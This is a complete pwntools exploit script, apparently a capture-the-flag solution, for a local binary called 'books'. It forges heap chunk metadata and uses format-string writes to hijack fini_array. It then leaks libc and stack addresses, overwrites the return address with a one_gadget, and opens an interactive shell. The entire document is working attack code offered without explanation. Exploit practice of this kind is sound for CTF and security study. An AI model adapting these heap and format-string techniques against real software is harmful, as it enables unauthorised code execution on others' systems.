from pwn import *
context.binary = './books'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./books')

def dbg():
	raw_input()

def exploit():
	sa = lambda x, y: p.sendafter(x, y)
	sla = lambda x, y: p.sendlineafter(x, y)

	def cmd(ch):
		sla('5: Submit\n', ch)

	def edit_1(content):
		cmd('1')
		p.recvline()
		p.sendline(content)
		print "edit  chunk 1 success!"

	def edit_2(content):
		cmd('2')
		p.recvline()
		p.sendline(content)
		print "edit chunk 2 success"

	def delete_1():
		cmd('3')
		print "delete 1 success"

	def delete_2():
		cmd('4')
		print "delete 2 success"

	def submit(addr):
		cmd('5' + 'a'*7 + addr)

	fini_array0 = 0x6011b8		#0x400830
	again_addr = 0x400a39		#only 1.5 byte differs
	payload = '%' + str(0xa39-12) + "c%13$hn" + "+%31$p" + "?%28$p"
	

	edit_1(payload.ljust(0x80, 'a') + p64(0x00) + p64(0x151))													#malloc(0x80)
	gdb.attach(p, 'b* 0x400AF0')
	dbg()
	edit_2('b'*0x140 + p64(0x150) + p64(0x21) + 'a'*0x10 + p64(0x20) + p64(0x21))					#malloc(0x80)   => malloc(0x140)
	delete_2()
	submit(p64(fini_array0))
	p.recvuntil('+')
	p.recvuntil('+')
	p.recvuntil('+')
	__libc_start_main_addr = int(p.recv(14), 16) - 240
	libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
	system_addr = libc_base + libc.symbols['system']
	one_gadget = libc_base + 0x45216
	p.recvuntil('?')
	ret_addr = int(p.recv(14), 16) - 0xd8 - 0x110

	print 'system ==> ' + hex(system_addr)
	print "ret_addr ==> " + hex(ret_addr)


	cover_1 = '0x' + str(hex(one_gadget))[-2:]
	cover_2 = '0x' + str(hex(one_gadget))[-6:-2]

	cover_1 = int(cover_1, 16)
	cover_2 = int(cover_2, 16)

	payload = '%' + str(cover_1-12) + 'd%13$hhn'
	payload += '%' + str(cover_2 - cover_1) + 'd%14$hn'

	edit_1(payload.ljust(0x80, 'a') + p64(0x00) + p64(0x151))
	edit_2('b'*0x140 + p64(0x150) + p64(0x21) + 'a'*0x10 + p64(0x20) + p64(0x21))					#malloc(0x80)   => malloc(0x140)
	delete_2()
	submit(p64(ret_addr) + p64(ret_addr+1))

	p.interactive()
	p.close()



if __name__ == '__main__':
	exploit()


